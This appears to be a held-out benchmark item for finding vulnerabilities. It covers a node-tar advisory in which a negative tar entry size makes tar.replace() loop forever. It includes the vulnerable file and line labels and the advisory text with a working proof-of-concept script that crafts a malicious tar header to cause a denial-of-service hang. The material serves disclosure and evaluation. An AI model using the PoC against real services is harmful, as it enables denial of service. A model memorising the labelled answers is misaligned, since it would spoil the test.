@@ -1,0 +1,85 @@
+{
+  "id": "ghsa-8x88-c5mf-7j5w",
+  "title": "tar: node-tar: Negative tar entry size causes infinite loop in archive replace",
+  "role": "heldout",
+  "repo": {
+    "url": "https://github.com/isaacs/node-tar",
+    "commit": "e02a4e9e013c4be95302e2eb2047a942b883c27b",
+    "partial": true
+  },
+  "language": "javascript",
+  "framework": "",
+  "provenance": "Labels come from the maintainers' fix commit, not from a model: the lines it changed or removed in its parent commit (advisory GHSA-8x88-c5mf-7j5w). Whether the patch really addresses the advisory is recorded in history.label_review.",
+  "contamination": "Advisory published 2026-07-20 and fix committed 2026-06-27, both on or after 2026-03-10, after the 2026-03-03 release of gemini-3.1-flash-lite (knowledge cutoff January 2025): that model cannot have trained on this fix. A model with a later cutoff might have. The code may still resemble earlier public fixes of similar bugs in the same project.",
+  "bugs": [
+    {
+      "id": "ghsa-8x88-c5mf-7j5w",
+      "title": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+      "class": "dos",
+      "cwe": "CWE-835",
+      "locations": [
+        {
+          "file": "src/header.ts",
+          "lines": [
+            10,
+            10
+          ]
+        },
+        {
+          "file": "src/header.ts",
+          "lines": [
+            106,
+            109
+          ]
+        },
+        {
+          "file": "src/header.ts",
+          "lines": [
+            205,
+            205
+          ]
+        },
+        {
+          "file": "src/pax.ts",
+          "lines": [
+            189,
+            194
+          ]
+        },
+        {
+          "file": "src/pax.ts",
+          "lines": [
+            200,
+            200
+          ]
+        }
+      ],
+      "notes": "Judge a finding against the advisory text in `history`, not only against the lines."
+    }
+  ],
+  "variants": {},
+  "history": {
+    "advisory": "GHSA-8x88-c5mf-7j5w",
+    "advisory_url": "https://github.com/advisories/GHSA-8x88-c5mf-7j5w",
+    "severity": "high",
+    "published": "2026-07-20",
+    "package": "tar",
+    "ecosystem": "npm",
+    "vulnerable_versions": "<= 7.5.17",
+    "patched": "7.5.18",
+    "fix_commit": "9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5",
+    "fix_url": "https://github.com/isaacs/node-tar/commit/9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5",
+    "fix_date": "2026-06-27T22:22:15Z",
+    "changed_lines": 19,
+    "source_files_changed": [
+      "src/header.ts",
+      "src/pax.ts"
+    ],
+    "other_files_changed": 2,
+    "addition_only": false,
+    "source_bytes": 195090,
+    "fits_in_one_prompt": true,
+    "description": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n### PoC\n\nSave as `poc.mjs` in a project with the vulnerable package installed and run:\n\n```bash\nnode poc.mjs\n```\n\n```js\nimport fs from 'node:fs'\nimport os from 'node:os'\nimport path from 'node:path'\nimport { spawnSync } from 'node:child_process'\n\nconst oct = (b, n, off, len) =>\n  b.write(n.toString(8).padStart(len - 1, '0') + '\\0', off, len, 'ascii')\n\nconst badHeader = () => {\n  const h = Buffer.alloc(512)\n\n  h.write('x', 0)\n  oct(h, 0o644, 100, 8)\n  oct(h, 0, 108, 8)\n  oct(h, 0, 116, 8)\n\n  // base-256 encoded -512 in the size field\n  Buffer.alloc(10, 0xff).copy(h, 124)\n  h[134] = 0xfe\n  h[135] = 0x00\n\n  oct(h, 0, 136, 12)\n  h.fill(0x20, 148, 156)\n  h[156] = 0x30\n  h.write('ustar\\0' + '00', 257, 8, 'binary')\n\n  let sum = 0\n  for (const c of h) sum += c\n  h.write(sum.toString(8).padStart(6, '0') + '\\0 ', 148, 8, 'ascii')\n\n  return h\n}\n\nconst dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))\nconst file = path.join(dir, 'poc.tar')\n\nfs.writeFileSync(file, badHeader())\nfs.writeFileSync(path.join(dir, 'add.txt'), 'x')\n\nconst r = spawnSync(\n  process.execPath,\n  [\n    '--input-type=module',\n    '-e',\n    `\n      import * as tar from 'tar'\n      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])\n      console.log('completed')\n    `,\n  ],\n  { timeout: 20_000 }\n)\n\nconsole.log(r.error?.code === 'ETIMEDOUT')\n\n// Output: true\n```\n\n### Impact\n\nAn application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.",
+    "label_review": "Claude read the fix patch against the advisory text on 2026-10-24 and found they match (one reader, not independently reviewed)."
+  }
+}
